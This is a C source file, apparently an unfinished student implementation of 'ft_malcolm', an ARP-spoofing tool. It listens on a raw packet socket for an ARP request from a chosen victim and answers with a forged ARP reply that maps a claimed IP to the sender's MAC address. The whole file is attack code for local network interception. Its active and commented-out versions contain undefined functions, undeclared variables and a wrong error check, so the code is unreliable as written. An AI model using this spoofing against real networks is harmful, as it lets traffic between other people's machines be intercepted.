#include "ft_malcolm.h"

volatile sig_atomic_t g_running = 1;
void    handle_sigint(int sig)
{
    (void)sig;
    g_running = 0;
}

static  int     create_raw_socket(void)
{
    // AF_PACKET gives access to the Ethernet layer.
    int fd = socket(AF_PACKET, SOCK_RAW, htons(0x0806));
    if (fd < 0) 
    {
        perror("ft_malcolm: socket");
        return -1;
    }
    // NOTE: hard coded timeout for now.
    struct timeval tv;
    tv.tv_sec = 5000 / 1000;
    tv.tv_usec = (5000 % 1000) * 1000;
    if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
        perror("ft_malcolm: setsocketopt(SO_RCVTIMEO)");
    return fd;
}

/*
 * Ethernet header occupies exactly 14 bytes
 * DESTINATION MAC (6 Bytes)
 * SOURCE MAC (6 Bytes)
 * EtherType (2 bytes)
 * Payload
 * */
static int create_arp_message(t_data *data, packet *pkt)
{
    memset(pkt, 0, sizeof(packet));

    /* Ethernet header */
    memcpy(pkt->eth.h_source, data->source_mac, ETH_ALEN);
    memcpy(pkt->eth.h_dest, data->target_mac, ETH_ALEN);
    pkt->eth.h_proto = htons(ETH_P_ARP);

    /* ARP header */
    pkt->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    pkt->arp.ea_hdr.ar_pro = htons(ETH_P_IP);
    pkt->arp.ea_hdr.ar_hln = ETH_ALEN;
    pkt->arp.ea_hdr.ar_pln= 4;
    // NOTE: We must send an unsolicited (gratuitous ARP) REPLY ot the victim.
    pkt->arp.ea_hdr.ar_op = htons(ARPOP_REPLY);

    /* ARP addresses */
    /* sha = source_mac, spa = source_ip (we claim to be source ip)
     * tha = target_mac, tpa = target_ip (we tell target this mapping)
     */
    memcpy(pkt->arp.arp_sha, data->source_mac, ETH_ALEN);
    memcpy(pkt->arp.arp_spa, data->source_ip, 4);
    memcpy(pkt->arp.arp_tha, data->target_mac, ETH_ALEN);
    memcpy(pkt->arp.arp_tpa, data->target_ip, 4);

    return 0;
}

// Get's the default interface
/*
int get_interface(char *iface, size_t len)
{
    struct if_nameindex *ifs = if_nameindex();
    if (!ifs)
        return (-1);
    for (struct if_nameindex *it = ifs; it->if_name; it++)
    {
        // Skip loopback
        if (strncmp(it->if_name, "lo", 2) == 0)
            continue;
        if (strlen(it->if_name) < len)
        {
            strncpy(iface, it->if_name, len-1);
            iface[len -1] = '\0';
            if_freenameindex(ifs);
            return (0);
        }
    }
    if_freenameindex(ifs);
    return (-1);
} */

/*

int     ft_malcolm(t_data *data)
{
    // Step 1: open correct socket and bind it to default iface
    int fd = create_raw_socket();
    if (fd < 0) return -1;
    if (data->iface[0] == '\0' && get_interface(data->iface, sizeof(data->iface)) < 0)
    {
        fprintf(stderr, "no default interface found\n");
        close(fd);
        return (-1);

    }
    
    struct  sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex(data->iface);
    sll.sll_protocol = htons(ETH_P_ARP);
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
    {
        perror("bind");
        close(fd);
        return (-1);
    }
    // Step 2: Create the Ethernet Frame Header and arp message inside it.
    int counter=0;
    while (g_running)
    {
        // Step 3: Listen for ARP request
        unsigned char buffer[BUFFER_SIZE] = {0};
        ssize_t len = recvfrom(fd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&sll, sizeof(sll));
        if (len < 0)
        {
            fprintf(stderr, "recvfrom failed\n");
            close(fd);
            return (-1);
        }
        struct ethhdr eth_header = (struct ethhdr *)buffer;
        struct ether_arp arp_header = (struct ether_arp*)(buffer + sizeof(struct ethhdr));

        if(ntohs(eth_header->eth.h_proto) == ETH_P_ARP && ntohs(arp_header->operation)==1){
            if(ntohs(arp_header->ptype) != ETH_P_IP) {
                fprintf(stderr, "not an ipv4 address\n");
                close(fd);
                return (-1);
            }

            unsigned char* sender_mac = arp_header->arp.apr_sha;
            unsigned char* sender_ip = arp_header->arp.arp_spa;

            if (memcmp(sender_ip, data->target_ip, INET4_LEN) == 0 &&
                    memcmp(sender_mac, data->target_mac, ETH_ALEN) == 0) {
                if (data->verbose) {
                    //do something
                }
                packet pkt;
                if (create_arp_message(data, &pkt) < 0)
                {
                    close(fd);
                    return (-1);
                }
                ssize_t n = sendto(fd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sll, sizeof(sll));
                if (n < 0) {
                    perror("sendto");
                    break;
                }
                printf("ARP reply sent: %d\n", counter++); 
                close(fd);
                break;
            }
        }    
    }
    return (0);
} */


/*
 * Things to Restructure.
 * instead of using default interface/or first interface we encounter.. inspect teh received arp reqeust
 * then read dst ip address from received arp request and match availalbe interface based on that. */
 

static int  send_arp_reply(int fd, packet *pkt, int ifindex, unsigned char *target_mac)
{
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    dest.sll_ifindex = ifindex;
    dest.sll_halen = ETH_ALEN;

    memcpy(dest.sll_addr, target_mac, ETH_ALEN);

    ssize_t n = sendto(fd, pkt, sizeof(*pkt), 0, (struct sockaddr *)&dest, sizeof(dest));
    if (n < 0)
    {
        perror("sendto");
        return (-1);
    }

    if ((size_t)n != sizeof(*pkt))
        return (-1);

    return (0);
}

static int get_interface_name(int ifindex, char *iface, size_t len)
{
    char name[IF_NAMESIZE];
    if (!if_indextoname(ifindex, name)) return -1;
    if (strlen(name) >= len) return -1;
    strncpy(iface, name, len -1);
    iface[len-1] = '\0';
    return (0);
}


int     ft_malcolm(t_data *data)
{
    // Step 1: open correct socket and bind it to default iface
    int fd = create_raw_socket();
    if (fd < 0) return -1;
    if (data->iface[0] == '\0' && get_interface(data->iface, sizeof(data->iface)) < 0)
    {
        fprintf(stderr, "no default interface found\n");
        close(fd);
        return (-1);

    }
    
/*    struct  sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex(data->iface);
    sll.sll_protocol = htons(ETH_P_ARP);
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
    {
        perror("bind");
        close(fd);
        return (-1);
    } */
    // Step 2: Create the Ethernet Frame Header and arp message inside it.
    int counter=0;
    while (g_running)
    {
        // Step 3: Listen for ARP request
        unsigned char buffer[BUFFER_SIZE] = {0};
        struct sockaddr_ll sll; socklen_t len = sizeof(sll); memset(&sll, 0, sizeof(sll));


        ssize_t readlen = recvfrom(fd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&sll, &len);
        if (len < 0)
        {
            if (errno == EINTR)
                continue;
            perror("recvfrom");
            close(fd);
            return (-1);
        }
        // Validating minimum ethernet + arp packet size;
        if ((size_t)readlen < sizeof(struct ethhdr) + sizeof(struct ether_arp))
            continue;
        struct ethhdr *eth = (struct ethhdr *)buffer;
        struct ether_arp *arp = (struct ether_arp*)(buffer + sizeof(struct ethhdr));
        
        if (ntohs(eth->h_proto) != ETH_P_ARP)
            continue;
        if (ntohs(arp->ea_hdr.ar_hrd) != ARPHRD_ETHER)
            continue;
        if (ntohs(arp->ea_hdr.ar_pro) != ETH_P_IP)
            continue;
        if (arp->ea_hdr.ar_hln != ETH_ALEN || arp->ea_hdr.ar_pln != 4)
            continue;
        if (ntohs(arp->ea_hdr.ar_op) != ARPOP_REQUEST)
            continue;

        char iface[IF_NAMESIZE];
        if (get_interface_name(sll.sll_index, iface, sizeof(iface)) < 0) continue;
        
        if (memcmp(arp_header->arp_spa, data->target_ip, INET4LEN) != 0) continue;
        if (memcmp(arp_header->arp_sha, data->target_mac, ETH_ALEN) != 0) continue;

        if (data->verbose)
        {
            // print verbose print (arp request received on interface kinda prompt);
        }

        // construct and send reply
        packet pkt;
        if (create_arp_reply(fd, &pkt, sll.sll_ifindex, data->target_mac) < 0) { close (fd); return (-1); }
        if (send_arp_reply(fd, &pkt, sll.sll_ifindex, data->target_mac) < 0) { close(fd); return (-1); }

        printf("ARP reply sent: %d\n", counter++);
        break;
    }
    close(fd);
    return (0);
}
